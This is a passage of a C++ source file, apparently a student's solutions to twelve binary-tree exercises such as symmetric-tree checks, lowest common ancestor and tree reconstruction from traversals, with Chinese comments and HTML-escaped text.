50751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882883884885886887888889890891892893894895896897898899900901902903904905906907908909910911912913914915916917918919920921922923924925926927928929930931932933934935936937938939940941942943944945946947948949950951952953954955956957958959960961962963964965966967968969970971972973974975976977978979980981982983984985986987988989990991992993994995996997998999100010011002100310041005100610071008100910101011101210131014101510161017101810191020102110221023102410251026102710281029103010311032103310341035103610371038103910401041104210431044104510461047104810491050105110521053105410551056105710581059106010611062106310641065106610671068106910701071107210731074107510761077107810791080108110821083108410851086108710881089109010911092109310941095109610971098109911001101110211031104110511061107110811091110111111121113111411151116111711181119112011211122112311241125112611271128112911301131113211331134113511361137113811391140114111421143114411451146114711481149115011511152115311541155115611571158115911601161116211631164116511661167116811691170117111721173117411751176117711781179118011811182118311841185118611871188118911901191119211931194119511961197119811991200120112021203120412051206120712081209121012111212121312141215121612171218121912201221122212231224122512261227122812291230123112321233123412351236123712381239124012411242124312441245124612471248124912501251125212531254125512561257125812591260126112621263126412651266126712681269127012711272127312741275127612771278127912801281128212831284128512861287128812891290129112921293129412951296129712981299130013011302130313041305130613071308130913101311131213131314131513161317131813191320132113221323132413251326132713281329133013311332133313341335133613371338133913401341134213431344134513461347134813491350135113521353135413551356135713581359136013611362136313641365136613671368136913701371137213731374/******************************************************************************** 1.相同的树*/#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;queue&gt;#include &lt;sstream&gt;#include &lt;limits&gt;#include &lt;cmath&gt;using namespace std;//数据结构一：常规二叉树struct TreeNode1 &#123; int val; TreeNode1* left; TreeNode1* right; TreeNode1(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;&#125;;// 将数组转换为层序二叉树的函数TreeNode1* arrayToTree1(const vector&lt;string&gt;&amp; arr) &#123; if (arr.empty()) &#123; return nullptr; &#125; // 构建根节点 TreeNode1* root = new TreeNode1(stoi(arr[0])); queue&lt;TreeNode1*&gt; q; q.push(root); int i = 1; while (!q.empty() &amp;&amp; i &lt; arr.size()) &#123; TreeNode1* current = q.front(); q.pop();//stoi是C++中的一个函数，用于将字符串转换为整数。它的完整名称是std::stoi，属于&lt;string&gt;头文件中的函数。 // 构建左子树节点 if (arr[i] != &quot;null&quot;) &#123; current-&gt;left = new TreeNode1(stoi(arr[i])); q.push(current-&gt;left); &#125; i++; // 构建右子树节点 if (i &lt; arr.size() &amp;&amp; arr[i] != &quot;null&quot;) &#123; current-&gt;right = new TreeNode1(stoi(arr[i])); q.push(current-&gt;right); &#125; i++; &#125; return root;&#125;// 判断两个二叉树是否相同的函数bool isSameTree1(TreeNode1* p, TreeNode1* q) &#123; if (p == nullptr &amp;&amp; q == nullptr) &#123; return true; &#125; if (p == nullptr || q == nullptr) &#123; return false; &#125; return (p-&gt;val == q-&gt;val) &amp;&amp; isSameTree1(p-&gt;left, q-&gt;left) &amp;&amp; isSameTree1(p-&gt;right, q-&gt;right);&#125;// 释放二叉树内存的函数void deleteTree1(TreeNode1* root) &#123; if (root == nullptr) &#123; return; &#125; deleteTree1(root-&gt;left); deleteTree1(root-&gt;right); delete root;&#125;int main_1() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束/* // 找到第一个数组部分的起始位置和结束位置 size_t start1 = input.find(&#x27;[&#x27;); size_t end1 = input.find(&#x27;]&#x27;); // 提取第一个数组部分的字符串 string arrayString1 = input.substr(start1 + 1, end1 - start1 - 1); // 找到第二个数组部分的起始位置和结束位置 size_t start2 = input.find(&#x27;[&#x27;, end1 + 1); size_t end2 = input.find(&#x27;]&#x27;, start2 + 1); // 提取第二个数组部分的字符串 string arrayString2 = input.substr(start2 + 1, end2 - start2 - 1);*/ string arrayString2; getline(cin, arrayString2);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; // 解析输入字符串为字符串数组2 vector&lt;string&gt; arr2; stringstream ss2(arrayString2); string token2; while (getline(ss2, token2, &#x27;,&#x27;)) &#123; arr2.push_back(token2); &#125; if (arr1.size() != arr2.size()) &#123; cout &lt;&lt; &quot;false&quot; &lt;&lt; endl; &#125; else &#123; // 构建第一个二叉树 TreeNode1* p = arrayToTree1(arr1); // 构建第二个二叉树 TreeNode1* q = arrayToTree1(arr2); // 判断两个二叉树是否相同 bool result = isSameTree1(p, q); cout &lt;&lt; boolalpha &lt;&lt; result &lt;&lt; endl; // 释放二叉树内存 deleteTree1(p); deleteTree1(q); &#125; return 0;&#125;/*********************************************************************************2.二叉树的中序遍历,判断它是不是镜面对称*/// 判断二叉树是否对称的辅助函数bool isSymmetricHelper2(TreeNode1* leftNode, TreeNode1* rightNode) &#123; // 左子树和右子树都为空，对称 if (leftNode == nullptr &amp;&amp; rightNode == nullptr) &#123; return true; &#125; // 左子树或右子树有一个为空，不对称 if (leftNode == nullptr || rightNode == nullptr) &#123; return false; &#125; // 判断左子树的左子树和右子树的右子树是否对称，以及左子树的右子树和右子树的左子树是否对称 return (leftNode-&gt;val == rightNode-&gt;val) &amp;&amp; isSymmetricHelper2(leftNode-&gt;left, rightNode-&gt;right) &amp;&amp; isSymmetricHelper2(leftNode-&gt;right, rightNode-&gt;left);&#125;// 判断二叉树是否对称bool isSymmetric2(TreeNode1* root) &#123; if (root == nullptr) &#123; return true; &#125; return isSymmetricHelper2(root-&gt;left, root-&gt;right);&#125;int main_2() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //构建树 TreeNode1* p = arrayToTree1(arr1); if (isSymmetric2(p)) &#123; cout &lt;&lt; &quot;true&quot; &lt;&lt; endl; &#125; else cout &lt;&lt; &quot;false&quot; &lt;&lt; endl; return 0;&#125;/******************************************************************************3: 翻转二叉树给你一棵二叉树的根节点 root ，翻转这棵二叉树，并返回其根节点。*/// 交换二叉树的左右子树void swapLeftAndRight3(TreeNode1* root) &#123; if (root == nullptr) &#123; return; &#125; // 交换左右子树 TreeNode1* temp = root-&gt;left; root-&gt;left = root-&gt;right; root-&gt;right = temp; // 递归交换左右子树 swapLeftAndRight3(root-&gt;left); swapLeftAndRight3(root-&gt;right);&#125;//现在已经知道num//算当前层数int calculateHeight3(int num) &#123; int height = 0; while (pow(2, height) - 1 &lt; num) &#123; height++; &#125; return height;&#125;//满二叉树最多有几个节点int calculateNodeCount3(int height) &#123; return pow(2, height) - 1;&#125;// 层序遍历二叉树void levelOrderTraversal3(TreeNode1* root,int num) &#123; if (root == nullptr) &#123; return; &#125; queue&lt;TreeNode1*&gt; q; q.push(root); int i = 0,null=0; while (!q.empty()) &#123; i++; TreeNode1* current = q.front(); q.pop(); if (current) &#123; cout &lt;&lt; current-&gt;val; if (current-&gt;left || current-&gt;right) &#123; if (current-&gt;left) &#123; q.push(current-&gt;left); &#125; else &#123; q.push(nullptr); null++; &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; else &#123; q.push(nullptr); null++; &#125; &#125; else if (i &lt; num) &#123; q.push(nullptr); q.push(nullptr); null += 2; &#125; &#125; else &#123; null--; cout &lt;&lt; &quot;null&quot;; &#125; if (null == q.size()) break; if (!q.empty()) &#123; cout &lt;&lt; &quot;,&quot;; &#125; &#125;&#125;int main_3() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 int num = 0; // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); num++; &#125; int height = calculateHeight3(num); int num1 = calculateNodeCount3(height-1); //构建树 TreeNode1* p = arrayToTree1(arr1); swapLeftAndRight3(p); levelOrderTraversal3(p,num1); return 0;&#125;//1,2,2,3,4,4,5,5,null,5,5,4,4,3,4,null,5,4/*4: 左叶子之和题目描述给定二叉树的根节点 root ，返回所有左叶子之和。输入描述一个节点序列输出描述返回其左叶子之和*/// 加二叉树左树叶子void Addleft4(TreeNode1* root) &#123; if (root == nullptr) &#123; cout &lt;&lt; &quot;0&quot; &lt;&lt; endl; return; &#125; if (!(root-&gt;left || root-&gt;right)) &#123; cout &lt;&lt; &quot;0&quot; &lt;&lt; endl; return; &#125; int num = 0; int flag = 0; queue&lt;TreeNode1*&gt; q; TreeNode1* a = new TreeNode1(-1); q.push(root); while (!q.empty()) &#123; TreeNode1* current = q.front(); q.pop(); if (current-&gt; val==- 1) &#123; flag = 1; //cout &lt;&lt; flag&lt;&lt;&quot; &quot;&lt;&lt;q.front()-&gt;val &lt;&lt; endl; continue; &#125; else if (current) &#123; if (current-&gt;left || current-&gt;right) &#123; if (current-&gt;left) &#123; q.push(a);//左子树前先加个-1进去 q.push(current-&gt;left); &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; flag = 0; &#125; else if (flag == 1 &amp;&amp; current &amp;&amp; !(current-&gt;left || current-&gt;right)) &#123; // cout &lt;&lt; current-&gt;val &lt;&lt; endl; num += current-&gt;val; //cout &lt;&lt; num &lt;&lt; endl; flag = 0; &#125; else; &#125; &#125; cout &lt;&lt; num &lt;&lt; endl;&#125;int main_4() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //构建树 TreeNode1* p = arrayToTree1(arr1); Addleft4(p); return 0;&#125;/******************************************************************5.*构建最小二叉搜索树*/// 递归构建二叉搜索树//分治思想int BSTnum = 0;TreeNode1* buildBST5(vector&lt;string&gt; nums, int start, int end) &#123; if (start &gt; end) &#123; return NULL; &#125; else BSTnum++; int mid = 0; if (end - start % 2 == 0) &#123; mid = start + (end - start) / 2; &#125; else &#123; mid = start + (end - start+1)/ 2; &#125; //cout &lt;&lt; mid &lt;&lt; endl; TreeNode1* root = new TreeNode1(stoi(nums[mid])); root-&gt;left = buildBST5(nums, start, mid - 1); root-&gt;right = buildBST5(nums, mid + 1, end); return root;&#125;// 创建高度最小的二叉搜索树TreeNode1* createMinimalBST(vector&lt;string&gt; nums) &#123; // cout &lt;&lt; nums.size() - 1 &lt;&lt; endl; return buildBST5(nums, 0, nums.size()-1);&#125;int main_5() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; int num = 0; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); num++; &#125; //构建树 TreeNode1* p = createMinimalBST(arr1); int height = calculateHeight3(BSTnum); int num1 = calculateNodeCount3(height - 1); levelOrderTraversal3(p,num1); return 0;&#125;/*第6题 给定完美二叉树，填充每个右指针struct Node &#123;int val;Node *left;Node *right;Node *next;&#125;填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。初始状态下，所有 next 指针都被设置为 NULL。输入描述给一个完美二叉树输出描述输出填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。输入输出样例输入root = [1,2,3,4,5,6,7]输出[1,#,2,3,#,4,5,6,7,#] 输入root = []输出[]*///有next的树节点struct TreeNextNode6 &#123; int val; TreeNextNode6* left; TreeNextNode6* right; TreeNextNode6* next; TreeNextNode6(int x) : val(x), left(nullptr), right(nullptr), next(nullptr)&#123;&#125;&#125;;int ErCiFang(int i) &#123; int n = 2; int num = 0; while(1) &#123; num += n; n *= 2; if (num == i) &#123; return 1; &#125; else if (num &gt; i) &#123; return 0; &#125; else continue; &#125;&#125;//构造有next指针的树//但给的数组里面没有null，因此不能直接给第9题用TreeNextNode6* PerfectTree6(vector&lt;string&gt;&amp; Tree) &#123; if (Tree.empty()) &#123; return nullptr; &#125; TreeNextNode6 *root = new TreeNextNode6(stoi(Tree[0])); root-&gt;next = nullptr; queue&lt;TreeNextNode6*&gt; q; q.push(root); int i = 1; int ans = 0; while (1) &#123; TreeNextNode6* current = q.front(); // cout &lt;&lt; &quot;存入:&quot; &lt;&lt; current-&gt;val&lt;&lt;endl; q.pop(); ans++; //构建next指针 if (!q.empty()) &#123; TreeNextNode6* next = q.front(); if (ErCiFang(ans-1)) &#123; current-&gt;next = nullptr; // cout &lt;&lt; &quot;产生一个#&quot; &lt;&lt; endl; &#125; else &#123; // cout&lt;&lt;current-&gt;val &lt;&lt; &quot;产生一个next是&quot;; current-&gt;next = next; // cout &lt;&lt; next-&gt;val &lt;&lt; endl; &#125; &#125; // 构建左子树节点 if (i &lt; Tree.size()) &#123; current-&gt;left = new TreeNextNode6(stoi(Tree[i])); q.push(current-&gt;left); //cout &lt;&lt; &quot; mama&quot; &lt;&lt; current-&gt;val &lt;&lt; &quot;mama &quot;; &#125; i++; // 构建右子树节点 if (i &lt; Tree.size())&#123; current-&gt;right = new TreeNextNode6(stoi(Tree[i])); q.push(current-&gt;right); &#125; i++; if (q.empty()) &#123; break; &#125; &#125; return root;&#125;// next层序遍历二叉树void LevelTraversalPerfectTree6(TreeNextNode6* root) &#123;//完美树不存在空树 if (root == nullptr) &#123; cout &lt;&lt; &#x27; &#x27; &lt;&lt; endl; return; &#125; queue&lt;TreeNextNode6*&gt; q; q.push(root); while (root-&gt;left) &#123;//先存入全部最左元素 q.push(root-&gt;left); root = root-&gt;left; &#125; while (!q.empty()) &#123; TreeNextNode6* current = q.front(); q.pop(); while (current) &#123; cout &lt;&lt; current-&gt;val &lt;&lt; &quot;,&quot;; current = current-&gt;next; &#125; if (!q.empty()) &#123; cout &lt;&lt; &quot;#,&quot;; &#125; else cout &lt;&lt; &quot;#&quot; &lt;&lt; endl; &#125;&#125;int main_6() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //构建完美树 TreeNextNode6* p = PerfectTree6(arr1); // cout &lt;&lt; &quot;构建成功&quot; &lt;&lt; endl; LevelTraversalPerfectTree6(p); return 0;&#125;/*7: 二叉树的最近公共祖先题目描述给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。（一个节点也可以是它自己的祖先）。输入描述给一个二叉树输出描述输出它的最近公共近邻输入输出样例输入root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1输出3输入root = [1,2], p = 1, q = 2输出1*/struct ParentTreeNode7 &#123; int val; int ans; ParentTreeNode7* left; ParentTreeNode7* right; ParentTreeNode7* parent; ParentTreeNode7(int x, int y) : val(x), ans(y),left(nullptr), right(nullptr), parent(nullptr) &#123;&#125;&#125;;// 将数组转换为有父母的层序二叉树的函数ParentTreeNode7* ParentTree7(const vector&lt;string&gt;&amp; arr) &#123; if (arr.empty()) &#123; return nullptr; &#125; int ans = 1; // 构建根节点 ParentTreeNode7* root = new ParentTreeNode7(stoi(arr[0]),ans); root-&gt;parent = root; queue&lt;ParentTreeNode7*&gt; q; q.push(root); ans++; int i = 1; while (!q.empty() &amp;&amp; i &lt; arr.size()) &#123; ParentTreeNode7* current = q.front(); q.pop(); //stoi是C++中的一个函数，用于将字符串转换为整数。它的完整名称是std::stoi，属于&lt;string&gt;头文件中的函数。 // 构建左子树节点 if (arr[i] != &quot;null&quot;) &#123; current-&gt;left = new ParentTreeNode7(stoi(arr[i]), ans); current-&gt;left-&gt;parent = current; q.push(current-&gt;left); ans++; &#125; //else ans++; i++; // 构建右子树节点 if (i &lt; arr.size() &amp;&amp; arr[i] != &quot;null&quot;) &#123; current-&gt;right = new ParentTreeNode7(stoi(arr[i]), ans); current-&gt;right-&gt;parent = current; q.push(current-&gt;right); ans++; &#125; //else ans++; i++; &#125; return root;&#125;//层序遍历到p然后指针停在那里ParentTreeNode7* Findpq7(ParentTreeNode7* root, int p) &#123; if (root == nullptr) &#123; return root; &#125; queue&lt;ParentTreeNode7*&gt; q; q.push(root); ParentTreeNode7* current = q.front(); while (!q.empty()) &#123; ParentTreeNode7* current = q.front(); q.pop(); if (current-&gt;ans == p) return current; if (current-&gt;left) &#123; q.push(current-&gt;left); &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; &#125; return current;&#125;void FindSameParent7(ParentTreeNode7* root,int p,int q)&#123; //层序遍历到p然后指针停在那里 ParentTreeNode7* a = Findpq7(root, p); // cout &lt;&lt; &quot;a查找成功:ans为&quot; &lt;&lt;a-&gt;ans&lt;&lt; &quot;val为&quot; &lt;&lt; a-&gt;val&lt;&lt; endl; ParentTreeNode7* b = Findpq7(root, q); // cout &lt;&lt; &quot;b查找成功:ans为&quot; &lt;&lt; b-&gt;ans&lt;&lt; &quot;val为&quot; &lt;&lt; b-&gt;val&lt;&lt;endl; while (1) &#123; // cout &lt;&lt; &quot;********遍历查找*********&quot;&lt;&lt; endl; if (a-&gt;parent == b-&gt;parent) &#123;//当前就已经相同 cout &lt;&lt; a-&gt;parent-&gt;val &lt;&lt; endl; break; &#125; else if (a == b-&gt;parent) &#123; cout &lt;&lt; a-&gt;val &lt;&lt; endl; break; &#125; else if (a-&gt;parent == b) &#123; cout &lt;&lt; b-&gt;val &lt;&lt; endl; break; &#125; //else if (a-&gt;parent == root || b-&gt;parent == root) &#123;//遍历到底 // cout &lt;&lt; &quot;输出了root值&quot; &lt;&lt; endl; // cout &lt;&lt; root-&gt;val &lt;&lt; endl; // break; // &#125; else if (a-&gt;parent-&gt;ans &lt; b-&gt;parent-&gt;ans) &#123; // cout &lt;&lt; &quot;b+1此时a的ans比b小,a为&quot; &lt;&lt; a-&gt;parent-&gt;ans &lt;&lt; &quot;,b为&quot; &lt;&lt; b-&gt;parent-&gt;ans &lt;&lt; endl; b = b-&gt;parent; &#125; else if (a-&gt;parent-&gt;ans &gt; b-&gt;parent-&gt;ans) &#123; // cout &lt;&lt; &quot;a+1此时b的ans比a小,a为&quot; &lt;&lt; a-&gt;parent-&gt;ans &lt;&lt; &quot;,b为&quot; &lt;&lt; b-&gt;parent-&gt;ans &lt;&lt; endl; a = a-&gt;parent; &#125; else continue; &#125;&#125;int main_7() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; int p = 0, q = 0; cin &gt;&gt; p &gt;&gt; q; //构建父母树 ParentTreeNode7* root = ParentTree7(arr1); // cout &lt;&lt; &quot;构建成功&quot; &lt;&lt; endl; FindSameParent7(root, p, q); return 0;&#125;/*第八题，给了二叉搜索树* 8: 恢复二叉搜索树题目描述给你二叉搜索树的根节点 root ，该树中的 恰好 两个节点的值被错误地交换。请在不改变其结构的情况下，恢复这棵树 。输入描述给一个二叉树输出描述恢复这棵树输入输出样例输入root = [1,3,null,null,2]输出[3,1,null,null,2]输入Root = [3,1,4,null,null,2]输出[2,1,4,null,null,3]**********提醒：* 二叉搜索树满足任意节点的左子树们恒定小于它，右边大于它* 此处只有两个节点值，因此我们最笨的想法就是固定一个节点往下遍历它的有没有不符合的，直到结束* 优化算法，，，，，待会看题解*///可考虑输出中序遍历，然后存成数组，数组里面的只有两个数字有问题，交换即可//构造已知二叉搜索树，可以调用树生成那个函数，他给的就是层序遍历TreeNode1 *FindWrongNode8(TreeNode1* root) &#123;//返回那个跟它错误的节点 queue&lt;TreeNode1*&gt; left;//左边 if (root-&gt;left) &#123; if (root-&gt;left-&gt;val &gt; root-&gt;val) &#123; return root-&gt;left; &#125; left.push(root-&gt;left); while (!left.empty()) &#123; TreeNode1* current = left.front(); left.pop(); //保证每个存进队列 if (current-&gt;left) &#123; left.push(current-&gt;left); &#125; if (current-&gt;right) &#123; left.push(current-&gt;right); &#125; if (current-&gt;val &gt; root-&gt;val) &#123; return current; &#125; &#125; &#125; queue&lt;TreeNode1*&gt; right; if (root-&gt;right ) &#123; if (root-&gt;right-&gt;val &lt; root-&gt;val) &#123; return root-&gt;right; &#125; right.push(root-&gt;right); while (!right.empty()) &#123; TreeNode1* current = right.front(); right.pop(); //保证每个存进队列 if (current-&gt;left) &#123; right.push(current-&gt;left); &#125; if (current-&gt;right) &#123; right.push(current-&gt;right); &#125; if (current-&gt;val &lt; root-&gt;val) &#123; return current; &#125; &#125; &#125; &#125;TreeNode1* RepirWrongTree8(TreeNode1* root) &#123; //1.固定一个，看左右子树有无问题 //2.可以爆破，层序遍历每一个， //因为只有两个不同，将每个节点看成root找子树，找到就交换val，break //3.返回root根节点 queue&lt;TreeNode1*&gt; q; q.push(root); while (!q.empty()) &#123; TreeNode1* current = q.front(); q.pop(); //保证每个存进队列 if (current-&gt;left) &#123; q.push(current-&gt;left); &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; //查找当前的Node下是否有错误 //有则交换val并退出 //无则继续往下检索 TreeNode1* Wrong = FindWrongNode8(current); if (Wrong != current) &#123;//如果不等交换退出循环 int temp = Wrong-&gt;val; Wrong-&gt;val = current-&gt;val; current-&gt;val = temp; break; &#125; &#125; return root;&#125;int main_8() &#123; string arrayString1; int num = 0; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); num++; &#125; //num辅助待会输出 int height = calculateHeight3(num); int num1 = calculateNodeCount3(height - 1); TreeNode1* root = arrayToTree1(arr1);//构建树 root = RepirWrongTree8(root);//修复树 levelOrderTraversal3(root,num1);//输出现在的树 return 0;&#125;/************************第9题************************** * 9: 奇偶数题目描述如果一棵二叉树满足下述几个条件，则可以称为 奇偶树 ：二叉树根节点所在层下标为 0 ，根的子节点所在层下标为 1 ，根的孙节点所在层下标为 2 ，依此类推。偶数下标 层上的所有节点的值都是 奇 整数，从左到右按顺序 严格递增奇数下标 层上的所有节点的值都是 偶 整数，从左到右按顺序 严格递减给你二叉树的根节点，如果二叉树为 奇偶树 ，则返回 true ，否则返回 false 。输入描述给一个二叉树输出描述判断是否是奇偶树输入输出样例输入root = [1,10,4,3,null,7,9,12,8,6,null,null,2]输出true输入root = [2,1,3]输出false*///题目要求//1.偶数层为奇整数、递增//2.奇数层为偶整数、递减//考虑，，设置计层器，利用队列，对每层单独判断bool isEvenOddTree9(TreeNode1* root) &#123; queue&lt;TreeNode1*&gt; queue; int level = 0; queue.push(root); while (!queue.empty()) &#123; int size = queue.size(); int preVal = level % 2 == 0 ? 0 : 1000001; for (int i = 0; i &lt; size; i++) &#123;//每一次处理一层，把一层的全部pop出去后开始下一层 TreeNode1* node = queue.front(); queue.pop(); int val = node-&gt;val; if (level % 2 == val % 2) &#123; return false; &#125; if ((level % 2 == 0 &amp;&amp; val &lt;= preVal) || (level % 2 == 1 &amp;&amp; val &gt;= preVal)) &#123; return false; &#125; if (node-&gt;left != nullptr) &#123; queue.push(node-&gt;left); &#125; if (node-&gt;right != nullptr) &#123; queue.push(node-&gt;right); &#125; preVal = val; &#125; level++; &#125; return true;&#125;int main_9() &#123; string arrayString1; getline(cin, arrayString1);//getline可以读入空格，以换行结束 // 解析输入字符串为字符串数组1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //构建奇偶树 TreeNode1* root = arrayToTree1(arr1); //判断是否为奇偶树 if (isEvenOddTree9(root)) &#123; cout &lt;&lt; &quot;true&quot; &lt;&lt; endl; &#125; else cout &lt;&lt; &quot;false&quot; &lt;&lt; endl; return 0;&#125;/*10 10.二叉树的子树大小描述现在给出一棵二叉树，希望你输出它的每一个结点为根的子树大小输入第一行一个正整数 n，表示给定的树的节点的数目，规定节点编号 1∼n，其中节点 1是树根。接下来 n 行，每行两个正整数 li, ri ​ ，分别表示节点 i 的左右孩子的编号。如果不存在左 / 右孩子，则以 −1 表示。两个数之间用一个空格隔开。输出一行，n个数，分别表示i号结点为根的子树的子树大小样例输入32 3-1 -1-1 -1输出3 1 1*///思考了一下之后可以直接用顺序存储//不用链表，定义数据结构，然后用数组struct TreeNode10&#123; int left; int right;&#125;;vector&lt;int&gt; subtreeSizes;int getSubtreeSize10(int root, const vector&lt;TreeNode10&gt;&amp; tree) &#123; if (root == -1) &#123; return 0; &#125; int leftSize = getSubtreeSize10(tree[root].left, tree); int rightSize = getSubtreeSize10(tree[root].right, tree); int currentSize = leftSize + rightSize + 1; subtreeSizes[root] = currentSize; return currentSize;&#125;int main_10() &#123; int n; cin &gt;&gt; n; vector&lt;TreeNode10&gt; tree(n + 1); // 为了与题目中的节点编号从1开始保持一致，使用大小为n+1的vector // 读取树的信息 for (int i = 1; i &lt;= n; i++) &#123; cin &gt;&gt; tree[i].left &gt;&gt; tree[i].right; &#125; subtreeSizes.resize(n + 1); // 初始化存储子树大小的数组 // 计算每个结点为根的子树大小 getSubtreeSize10(1, tree); // 输出结果 for (int i = 1; i &lt;= n; i++) &#123; cout &lt;&lt; subtreeSizes[i] &lt;&lt; &quot; &quot;; &#125; return 0;&#125;/*11题，11题很好，和10题很像，相当于多了一个节点自身代值11: 二叉树的子树和描述现在给出一棵二叉树，每个结点有一个权值，希望你依次输出每一个节点为根的子树的子树权值和输入第一行一个正整数 n，表示给定的树的节点的数目，规定节点编号 1∼n，其中节点 1是树根。第二行 n 个正整数，用一个空格分隔，第 i 个正整数vi，代表节点 i 的权值。接下来 n 行，每行两个正整数 li, ri ​ ，分别表示节点 i 的左右孩子的编号。如果不存在左 / 右孩子，则以 −1 表示。两个数之间用一个空格隔开。输出一行，n个数，分别表示i号结点为根的子树的子树权值和样例输入31 1000 10002 3-1 -1-1 -1输出2001 1000 1000*///加了power的长数组struct TreeNode11 &#123; int left; int right; int power;&#125;;vector&lt;int&gt; subtreePowers;int getSubtreePower11(int root, const vector&lt;TreeNode11&gt;&amp; tree) &#123; if (root == -1) &#123; return 0; &#125; int leftPower = getSubtreePower11(tree[root].left,tree); int rightPower = getSubtreePower11(tree[root].right, tree); int currentPower = leftPower + rightPower + tree[root].power; subtreePowers[root] = currentPower; return currentPower;&#125;int main_11() &#123; int n; cin &gt;&gt; n; vector&lt;TreeNode11&gt; tree(n + 1); // 为了与题目中的节点编号从1开始保持一致，使用大小为n+1的vector for (int i = 1; i &lt;= n; i++) &#123; cin &gt;&gt; tree[i].power; &#125; // 读取树的信息 for (int i = 1; i &lt;= n; i++) &#123; cin &gt;&gt; tree[i].left &gt;&gt; tree[i].right; &#125; subtreePowers.resize(n + 1); // 初始化存储子树大小的数组 // 计算每个结点为根的子树大小 getSubtreePower11(1, tree); // 输出结果 for (int i = 1; i &lt;= n; i++) &#123; cout &lt;&lt; subtreePowers[i] &lt;&lt; &quot; &quot;; &#125; return 0;&#125;/*12: 确定树的形态描述现在给出一棵二叉树的前序遍历和后序遍历，输出树的后序遍历输入第一行一个正整数 n，表示给定的树的节点的数目，规定节点编号 1∼n，其中节点 1是树根。第二行 n 个正整数，用一个空格分隔，代表二叉树的前序遍历第三行 n 个正整数，用一个空格分隔，代表二叉树的中序遍历输出一行，n个数，用一个空格分隔，表示二叉树的后序遍历样例输入31 2 32 1 3输出2 3 1*///没想到，后面几个考遍历方法/*已知该二叉树的先序遍历序列为：A-B-D-E-G-C-F，中序遍历序列为：D-B-G-E-A-C-F。第一步：找根 先序遍历先遍历根结点 那么它的序列第一个肯定是根节点也就是上面的A第二步：找根结点的左右子数 中序遍历先左后根后右 在中序序列中找到根结点的位置那么它的左边就是它的左子树序列 右边就是它的右子数序列即上面的 D-B-G-E 和 C-F第三步：拆分转化为子问题 去掉A结点 将树分为两个二叉树 B-D-E-G 和C-F然后按照第一步分别找两颗树的根 B C 然后根据第二部找根的左右子数B(左边D 右边 G-E) C (左边NULL 右边 F) 一次类推 直到还原出二叉树的模型*/struct Node&#123; int data; Node* left; Node* right;&#125;;Node* getBinaryTree(int* preOrder, int* inOrder, int len)&#123; if (preOrder == nullptr || len &lt;= 0) return nullptr; Node* root = new Node; root-&gt;data = *preOrder; // 前序遍历的第一个节点就是根节点 // 找到根节点在中序遍历中的位置，其值也代表了左子树的节点数目 int pos = 0; while (inOrder[pos] != root-&gt;data) &#123; pos++; &#125; // 递归找到左子树和右子树 if (0 == pos) &#123; root-&gt;left = nullptr; &#125; else &#123; root-&gt;left = getBinaryTree(preOrder + 1, inOrder, pos); &#125; if (0 == len - pos - 1) &#123; root-&gt;right = nullptr; &#125; else &#123; root-&gt;right = getBinaryTree(preOrder + pos + 1, inOrder + pos + 1, len - pos - 1); &#125; return root;&#125;void postOrder(Node* root)&#123; if (root == nullptr) return; postOrder(root-&gt;left); postOrder(root-&gt;right); cout &lt;&lt; root-&gt;data&lt;&lt;&quot; &quot;;&#125;int main_12()&#123; int len; cin &gt;&gt; len; int* preOrder = new int[len];//preOder指向数组起始0处 int* inOrder = new int[len]; for (int i = 0; i &lt; len; ++i) &#123; cin &gt;&gt; preOrder[i]; &#125; for (int i = 0; i &lt; len; ++i) &#123; cin &gt;&gt; inOrder[i]; &#125; Node* root = getBinaryTree(preOrder, inOrder, len); postOrder(root); delete[] preOrder; delete[] inOrder; return 